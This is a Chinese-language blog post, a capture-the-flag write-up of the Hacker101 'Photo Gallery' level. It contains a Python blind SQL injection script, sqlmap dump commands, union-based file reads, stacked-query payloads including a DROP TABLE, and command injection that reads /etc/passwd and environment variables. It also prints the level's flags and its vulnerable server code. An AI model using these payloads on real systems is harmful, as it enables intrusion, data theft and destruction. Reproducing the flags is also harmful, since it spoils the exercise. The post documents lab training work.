---
title: "hacker101 第4关&&第5关"
date: 2019-10-19T10:47:35+08:00
showDate: true
draft: false
tags: ["security","hacker101", "ctf"]
categories: ["security"]
---

### 第4关 Photo Gallery

#### flag1

这关一进去看起来是一个图片展示的网页，三张图片，两个正常显示，一张500，看了下图片的地址。

```url

/fetch?id=1
/fetch?id=2
/fetch?id=3
```

丢到浏览器访问一下，好像直接是出来二进制数据，全是乱码。一开始我以为是要从图片里面找flag，然后尝试用ue打开，然后从里面找flag的16进制，结果什么也没找到。

然后试了试注入，加了一个`'`，200直接变成500，然后试试`' AND 1=1`，还是500，再试了试`AND 1=1`正常了，看来应该是int型的布尔盲注。

网上查了一下盲注的流程

获取数据库名字 -> 获取表名 -> 获取列名 -> 爆字段

我先手工试了一下

```sql 

AND LENGTH(DATABASE())=6
```

返回正常，说明数据库字符长度为6。然后开始用脚本爆数据库名。

```python
def get_available_ascii():
    A = 65
    a = 97
    zero = 48
    for i in [95] + list(range(a, a+26)) + list(range(A, A+26)) + list(range(zero, zero+10)):
        yield i


def guess_database_length(url):
    payload = " AND LENGTH(DATABASE())={}"
    for i in range(1, 33):
        u = url + payload.format(i)
        print(u)
        r = requests.head(u)
        print(r.status_code)
        if r.status_code == 200:
            return i

def guess_database_name(url, length):
    payload = " AND ASCII(MID(DATABASE(), {}, 1))={}"
    database_name = ""
    for pos in range(1, length+1):
        for s in get_available_ascii():
            u = url + payload.format(pos, s)
            r = requests.head(u)
            print(r.status_code)
            if r.status_code == 200:
                print(pos, chr(s))
                database_name += chr(s)
                break
    return database_name
```

这里用head方法是因为这个网站只需要知道响应码就ok了，这样可以提高请求的速度。

得到`database_name = 'level5'`

然后猜表

```python
def guess_database_tables(url, database_name):
    table1_length = 6 # 浏览器手工注入结果
    table2_length = 6
    tables = []
    payload = " AND ASCII(MID((SELECT table_name FROM information_schema.tables WHERE table_schema='{}' limit {}, 1), {}, 1))={}"
    for table_idx in range(2):
        table_name = ""
        for table_pos_idx in range(1, table1_length + 1):
            for s in get_available_ascii():
                u = url + payload.format(database_name, table_idx, table_pos_idx, s)
                r = requests.head(u)
                print(r.status_code)
                if r.status_code == 200:
                    print("table", table_idx, table_pos_idx, chr(s))
                    table_name += chr(s)
                    break
        tables.append(table_name)
    return tables
```

表长是手工注入的时候得到的，这里就直接当常量用了，最后得到结果为

```python

table0 = "albums"
table1 = "photos"
```

做到这一步，我打算直接上sqlmap了。kali启动~

先爆第一个表albums的字段

```bash
sqlmap --threads 10 -u "http://35.227.24.107/479b051cb9/fetch?id=1" -D level5 -T albums --columns

```

结果为

| Column | Type    |
|--------|---------|
| id     | int(11) |
| title  | text    |

接着爆数据

```bash
sqlmap --threads 10 -u "http://35.227.24.107/479b051cb9/fetch?id=1" -D level5 -T albums -C id,title --dump
```

看起来只有一条没什么用的数据

| id | title   |
|----|---------|
| 1  | Kittens |

接着下一个表photos爆出来的数据如下

| id | parent | title            | filename                                                         |
|----|--------|------------------|------------------------------------------------------------------|
| 1  | 1      | Utterly adorable | files/adorable.jpg                                               |
| 2  | 1      | Purrfect         | files/purrfect.jpg                                               |
| 3  | 1      | Invisible        | c46d5ba4cb81f5f75c59e560a1345c5b417b961616b8e98f48e75306a81439a6 |

看来之所以`/fetch?id=3`返回500是因为3的filename的文件不存在导致的吧。这看起来是一个64位md5，我放到cmd5上解密，没有结果。第二天早上起来我想了想，这玩意儿和flag长得也很像，于是就把他改成flag的格式

`^FLAG^c46d5ba4cb81f5f75c59e560a1345c5b417b961616b8e98f48e75306a81439a6$FLAG$`

提交发现果然是个flag。

#### flag2

距离上一个flag已经过去两天了，在过去的两天我尝试了各种办法，甚至用sqlmap把他的数据库都脱下来了，依然没有头绪。但是有几个突破口。

1. 尝试用load_file和into outfile来向文件系统读写文件，但是数据库的默认是设置secure_file_priv为null或者指定位置，并不能随意读写文件。于是放弃了。
2. 从photos表的filename可以看出，代码应该是读出filename的值然后从文件系统中读取图片内容并返回，所以`id=3`才会500。通过这点，我尝试了payload` union select '/etc/passwd'`，但是报了500。于是也放弃了。

今天看了两个hint

* Consider how you might build this system yourself. What would the query for fetch look like?
* Take a few minutes to consider the state of the union

这两个hint我感觉还是想让我从利用union读取系统文件入手。

因为之前第2关的sql注入爆出来的代码是python，我于是随手试了一下` union select 'main.py'`，果然是皇天不负有心人，直接爆出了源码，然后注释里有flag

![4-1.png](4-1.png)

#### flag3

第二个flag里爆出了服务端的代码，看起来是想我们从源码入手。

代码里唯一有用户输入的一段只有`GET /fetch`这个api，代码如下

```python
@app.route('/fetch')
def fetch():
	cur = getDb().cursor()
	if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0:
		abort(404)

	# It's dangerous to go alone, take this:
	# ^FLAG^c9ca117fc9876a4d0b1b09a76b8c3f1136e03dce5de40222400eed4f1c90e50f$FLAG$

	return open('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read()
```

最后一句把输入的filename强行绑定在了当前目录，我开始的想法是看能不能通过某些字符串来绕过`str.replace()`，google了好久也没有结果。

然后我想能不能在select后面跟一个update语句，尝试构造payload

`;update photos set filename='files/adorable.jpg' where id=3;`

把id=3的filename改成id=1的filename，提交完之后刷新index页面，没有反应。

google了一会儿我发现了一个叫做[Stacked injection](http://www.sqlinjection.net/stacked-queries/)的攻击方式。原来我上面的payload之所以没有反应是因为update语句一般需要加上commit

在找第二个flag的时候其实我也是过类似的payload

`;drop table photos`,而且甚至导致服务器直接500了，但是当时也没多想。于是构造payload

`;update photos set filename='files/adorable.jpg' where id=3;commit;`

再访问index页面，果然第三个图片变成了第一个图片。

既然能改数据库数据，那我的修改肯定也能影响下面的index路由了

```python
@app.route('/')
def index():
	cur = getDb().cursor()
	cur.execute('SELECT id, title FROM albums')
	albums = list(cur.fetchall())

	rep = ''
	for id, title in albums:
		rep += '<h2>%s</h2>\n' % sanitize(title)
		rep += '<div>'
		cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))
		fns = []
		for pid, ptitle, pfn in cur.fetchall():
			rep += '<div><img src="fetch?id=%i" width="266" height="150"><br>%s</div>' % (pid, sanitize(ptitle))
			fns.append(pfn)
		rep += '<i>Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '</i>'
		rep += '</div>\n'

	return home.replace('$ALBUMS$', rep)
```

代码里看起来是要du命令并返回结果，ubuntu里`du --help`看一下


```

-c, --total           produce a grand total
-h, --human-readable  print sizes in human readable format (e.g., 1K 234M 2G)
```

看来是打印三个文件的总大小然后返回输出结果的最后一行。fns是三个filename构成的列表，我只要把filename改造成我想要命令就能执行并返回了。

先构造fns，把id=3的filename改成`|| cat /etc/passwd`，页面里回显了，`/etc/passwd`的最后一行

![4-2.png](4-2.png)

看起来我需要把内容都显示在一行才行，查了一下可以通过管道用`xargs`就能单行输出了，先构造payload

`;update photos set filename='cat /etc/passwd|xargs' where id=3;commit;`

然后访问index页面，这下内容都出来了。

![4-3.png](4-3.png)

但是好像没有flag，再找找其他地方。找了好几个地方，最后在环境变量里面找到了，原来三个flag都在这，payload为

`;update photos set filename='export|xargs' where id=3;commit;`

![4-4.png](4-4.png)

历时一周，第4关完结~

### 第5关

不会php，暂时跳过

